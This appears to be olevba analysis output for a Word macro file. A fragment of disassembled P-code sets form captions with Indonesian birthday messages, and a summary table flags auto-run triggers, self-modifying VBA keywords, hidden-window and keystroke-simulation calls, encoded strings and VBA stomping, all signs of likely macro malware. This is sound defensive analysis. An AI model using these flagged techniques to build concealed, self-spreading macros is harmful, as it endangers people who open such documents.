' 	StartWithExpr 
' 	Ld Voldina 
' 	With 
' Line #250:
' 	LitStr 0x0014 "Happy Birthday Dhien"
' 	MemStWith Caption 
' Line #251:
' 	EndWith 
' Line #252:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	ElseIfBlock 
' Line #253:
' 	StartWithExpr 
' 	Ld Voldina 
' 	With 
' Line #254:
' 	LitStr 0x0014 "Pesan From Fhrazzthy"
' 	MemStWith Caption 
' Line #255:
' 	EndWith 
' Line #256:
' 	LitVarSpecial (False)
' 	Ld Image5 
' 	MemSt Visible 
' Line #257:
' 	LitVarSpecial (True)
' 	Ld Label8 
' 	MemSt Visible 
' Line #258:
' 	LineCont 0x0004 12 00 11 00
' 	LitStr 0x000B "!! INGAT !!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld bln 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "Voldina ulang tahun"
' 	Concat 
' 	Ld Label8 
' 	MemSt Caption 
' Line #259:
' 	ElseBlock 
' Line #260:
' 	StartWithExpr 
' 	Ld Voldina 
' 	With 
' Line #261:
' 	LitStr 0x0014 "Pesan From Fhrazzthy"
' 	MemStWith Caption 
' Line #262:
' 	EndWith 
' Line #263:
' 	LitVarSpecial (False)
' 	Ld Image5 
' 	MemSt Visible 
' Line #264:
' 	LitVarSpecial (True)
' 	Ld Label8 
' 	MemSt Visible 
' Line #265:
' 	LineCont 0x0004 12 00 11 00
' 	LitStr 0x000B "!! INGAT !!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld bln 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "Voldina ulang tahun"
' 	Concat 
' 	Ld Label8 
' 	MemSt Caption 
' Line #266:
' Line #267:
' 	EndIfBlock 
' Line #268:
' 	EndSub 
' Line #269:
' Line #270:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |UserForm_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

